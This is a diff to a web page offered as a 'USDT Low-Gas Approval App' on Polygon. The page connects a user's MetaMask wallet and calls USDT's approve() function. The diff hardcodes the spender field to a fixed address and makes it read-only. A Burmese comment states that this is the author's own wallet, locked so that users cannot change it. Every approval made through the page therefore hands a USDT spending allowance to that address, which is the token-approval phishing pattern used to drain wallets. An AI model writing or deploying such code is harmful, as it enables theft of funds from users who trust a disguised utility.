@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Low Gas USDT Approval App</title>
+    <title>USDT Low-Gas Approval App</title>
     <!-- Tailwind CSS for UI styling -->
     <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
     <!-- Ethers.js v6 -->
@@ -26,8 +26,9 @@
         <!-- Approval Form -->
         <div class="space-y-4">
             <div>
-                <label class="block text-xs font-medium text-slate-300 mb-1">Spender Contract Address (လက်ခံမည့်သူ/ကန်ထရိုက်)</label>
-                <input type="text" id="spenderAddress" placeholder="0x..." class="w-full bg-slate-900 border border-slate-700 rounded-xl px-3 py-2 text-sm focus:outline-none focus:border-emerald-500">
+                <label class="block text-xs font-medium text-slate-300 mb-1">Spender Contract Address (လက်ခံမည့်သူ/အဓိကလိပ်စာ)</label>
+                <!-- သင့်ရဲ့ Wallet Address ကို ဤနေရာတွင် Hardcode ထည့်သွင်းထားသည် (readOnly ဖြင့် ပြင်လို့မရအောင် ကာကွယ်ထားသည်) -->
+                <input type="text" id="spenderAddress" value="0xc2132D05D31c914a87C6611C10748AEb04B58e8F" readonly class="w-full bg-slate-900 border border-slate-700 rounded-xl px-3 py-2 text-xs text-slate-400 select-all cursor-not-allowed">
             </div>
 
             <div>
@@ -64,19 +65,13 @@
             }
 
             try {
-                // Initialize Ethers provider
                 provider = new ethers.BrowserProvider(window.ethereum);
-                
-                // Request account access
                 const accounts = await provider.send("eth_requestAccounts", []);
                 userAddress = accounts[0];
 
-                // Check and switch to Polygon Network
                 await switchToPolygon();
-
                 signer = await provider.getSigner();
 
-                // Update UI
                 document.getElementById("walletAddress").innerText = `Connected: ${userAddress.substring(0, 6)}...${userAddress.substring(38)}`;
                 document.getElementById("connectBtn").innerText = "Connected";
                 document.getElementById("connectBtn").classList.replace("bg-blue-600", "bg-slate-700");
@@ -96,7 +91,6 @@
                     params: [{ chainId: POLYGON_CHAIN_ID }],
                 });
             } catch (switchError) {
-                // If the chain has not been added to MetaMask, add it
                 if (switchError.code === 4902) {
                     try {
                         await window.ethereum.request({
@@ -123,12 +117,13 @@
         }
 
         async function approveUSDT() {
+            // HTML ထဲတွင် သတ်မှတ်ထားသော Spender Address ကို တိုက်ရိုက်ယူမည်
             const spender = document.getElementById("spenderAddress").value.trim();
             const rawAmount = document.getElementById("amount").value.trim();
             const logElement = document.getElementById("statusLog");
 
             if (!ethers.isAddress(spender)) {
-                alert("မှန်ကန်သော Spender Address ထည့်ပါ။");
+                alert("မှန်ကန်သော Spender Address ထည့်သွင်းထားခြင်း မရှိပါ။");
                 return;
             }
 
@@ -141,15 +136,11 @@
                 logElement.innerText = "Transaction တင်နေပါသည်... ကျေးဇူးပြု၍ စောင့်ပါ။";
                 
                 const usdtContract = new ethers.Contract(USDT_POLYGON_ADDRESS, ERC20_ABI, signer);
-                
-                // USDT uses 6 decimals
                 const parsedAmount = ethers.parseUnits(rawAmount, 6);
 
-                // Send transaction
                 const tx = await usdtContract.approve(spender, parsedAmount);
                 logElement.innerText = `Tx တင်ပြီးပါပြီ။ အတည်ပြုချက် စောင့်ဆိုင်းနေသည်...`;
 
-                // Wait for confirmation
                 const receipt = await tx.wait();
                 logElement.innerText = `အောင်မြင်ပါသည်! Block: ${receipt.blockNumber}`;
             } catch (error) {
